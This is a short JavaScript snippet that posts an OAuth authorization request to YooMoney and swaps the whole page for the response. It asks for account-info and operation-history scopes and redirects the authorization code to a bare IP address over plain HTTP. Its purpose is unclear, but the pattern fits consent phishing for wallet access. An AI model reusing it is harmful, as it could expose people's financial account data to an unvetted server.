var root = document.documentElement;

fetch("https://yoomoney.ru/oauth/authorize", {
  method: "post",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: "client_id=37B2979DA7A8F2BA802D236FF49625CBA9BB992A44F3DED85E193E32D86921C3&response_type=code&redirect_uri=http://194.59.40.99:8009/pay_page&scope=account-info operation-history",
}).then(async (response) => {
  root.innerHTML = await response.text();
});
